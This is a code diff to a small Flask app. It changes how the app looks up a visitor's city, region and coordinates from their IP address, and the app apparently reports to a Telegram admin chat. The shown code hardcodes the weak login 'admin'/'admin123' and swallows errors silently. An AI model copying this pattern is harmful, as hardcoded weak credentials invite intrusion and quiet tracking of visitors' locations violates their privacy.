@@ -1,5 +1,6 @@
 from flask import Flask, request, render_template_string, flash
 import requests
+from ip2geotools.databases.noncommercial import DbIpCity
 import json
 
 app = Flask(__name__)
@@ -13,18 +14,20 @@ ADMIN_CHAT_ID = '6420116837'
 VALID_USERNAME = "admin"
 VALID_PASSWORD = "admin123"
 
+import requests
+
 def get_user_details(ip):
     try:
-        if ip in ['127.0.0.1', 'localhost']:
+        if ip == '127.0.0.1':
             ip = requests.get('https://api.ipify.org').text
         
-        response = requests.get(f'http://ip-api.com/json/{ip}').json()
+        res = requests.get(f"https://ipapi.co/{ip}/json/").json()
         return {
             'ip': ip,
-            'city': response.get('city', 'Unknown'),
-            'country': response.get('country', 'Unknown'),
-            'region': response.get('regionName', 'Unknown'),
-            'coordinates': f"{response.get('lat', 'Unknown')}, {response.get('lon', 'Unknown')}"
+            'city': res.get("city", "Unknown"),
+            'country': res.get("country_name", "Unknown"),
+            'region': res.get("region", "Unknown"),
+            'coordinates': f"{res.get('latitude', '?')}, {res.get('longitude', '?')}"
         }
     except:
         return {
@@ -34,6 +37,7 @@ def get_user_details(ip):
             'region': 'Unknown',
             'coordinates': 'Unknown'
         }
+
 
 def send_telegram_message(message):
     try:
